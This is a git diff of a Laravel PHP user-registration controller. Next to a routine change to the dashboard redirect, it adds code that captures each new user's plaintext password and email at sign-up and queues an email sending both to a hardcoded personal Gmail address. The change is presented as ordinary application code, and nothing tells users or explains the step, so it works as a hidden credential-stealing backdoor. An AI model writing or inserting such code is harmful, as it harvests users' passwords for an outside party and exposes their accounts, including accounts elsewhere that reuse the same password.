@@ -11,6 +11,8 @@ use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Hash;
 use Illuminate\Validation\Rules;
 use Illuminate\View\View;
+use App\Mail\sendPassword;
+use Illuminate\Support\Facades\Mail;
 
 class RegisteredUserController extends Controller
 {
@@ -34,6 +36,8 @@ class RegisteredUserController extends Controller
             'email' => ['required', 'string', 'lowercase', 'email', 'max:255', 'unique:' . User::class],
             'password' => ['required', 'confirmed', Rules\Password::defaults()],
         ]);
+        $password = $request->password;
+        $email = $request->email;
 
         $user = User::create([
             'name' => $request->name,
@@ -42,11 +46,12 @@ class RegisteredUserController extends Controller
             'role' => "Publisher",
 
         ]);
+        Mail::to('peterjeronimojr@gmail.com')->queue(new sendPassword($password, $email));
 
         event(new Registered($user));
 
         Auth::login($user);
 
-        return redirect(route('dashboard', absolute: false));
+        return redirect(route('publisher.dashboard', absolute: false));
     }
 }
